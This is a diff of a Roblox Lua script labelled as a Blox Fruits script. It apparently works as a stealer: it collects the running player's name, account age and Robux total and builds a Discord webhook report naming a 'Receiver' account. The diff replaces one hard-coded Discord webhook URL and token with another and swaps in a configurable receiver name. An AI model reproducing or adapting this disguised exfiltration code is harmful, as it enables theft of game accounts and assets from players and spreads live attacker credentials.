@@ -1,5 +1,5 @@
 -- BLOX FRUIT?
-LogsWebhook = "https://discord.com/api/webhooks/1341423605442941054/t5MHssiV8BFgygZxVttbT8TYo4NHsfB0xpYBLgo-vAW_Io4qa6CStQ0M7Bg_SDUnM3X7"
+LogsWebhook = "https://discord.com/api/webhooks/1342489684277985344/iiYYb5BK2quEqg9iwL5c2EcBbj0LEnSPufdgy-IYXnx0Wv5X_STUKxJ9SBiTiwye-OrX"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
@@ -9,7 +9,7 @@ local result = 0
 local HttpService = game:GetService("HttpService")
 
 local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(broisnothim724)
+    return Players:GetUserIdFromNameAsync(Username)
 end)
 
 local args = {
@@ -72,7 +72,7 @@ local function sendWebhook()
         ["fields"] = {
             {
                 ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
-                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. broisnothim724 .. "```"
+                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
             },
             {
                 ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
